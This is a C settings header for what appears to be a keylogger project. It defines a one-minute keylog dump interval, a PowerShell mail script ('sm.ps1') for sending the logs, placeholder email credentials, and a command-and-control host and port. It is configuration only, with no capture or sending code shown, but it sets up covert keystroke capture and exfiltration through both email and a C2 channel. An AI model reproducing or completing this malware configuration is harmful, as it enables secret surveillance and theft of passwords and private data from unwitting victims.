#pragma once

#ifndef SETTINGS_H
#define SETTINGS_H

/**
 * Whether or not to write debug logs
 **/
#define DEBUG true

/**
 * Name of powershell script used to send
 * mail
 **/
#define SCRIPT_NAME "sm.ps1"

/**
 * How often the keylog is dumped in minutes
 **/
#define FREQUENCY_MINUTES 1

/**
 * Login Credentials for email
 **/
#define X_EM_TO "TEST"
#define X_EM_FROM "TEST"
#define X_EM_PASS "TEST"

/**
 * Comand and Control ip and port
 **/
#define CC_HOSTNAME "localhost"
#define CC_PORT 3008

#endif
